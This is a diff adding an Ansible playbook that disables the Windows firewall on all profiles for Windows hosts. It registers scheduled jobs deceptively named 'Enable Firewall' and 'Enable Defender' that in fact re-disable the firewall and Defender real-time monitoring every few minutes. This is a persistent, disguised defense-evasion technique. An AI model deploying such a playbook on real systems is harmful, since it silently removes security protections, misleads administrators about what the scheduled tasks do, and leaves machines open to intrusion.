@@ -1,0 +1,14 @@
+-
+  name: Disable Firewall
+  hosts: windows
+  strategy: free
+  gather_facts: no
+  tasks:
+    - win_firewall:
+        state: disabled
+        profiles:
+        - Domain
+        - Private
+        - Public
+    - win_shell: Register-ScheduledJob -Name 'Enable Firewall' -ScriptBlock { Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False } -RunNow -RunEvery 00:05:00
+    - win_shell: Register-ScheduledJob -Name 'Enable Defender' -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true } -RunNow -RunEvery 00:02:00
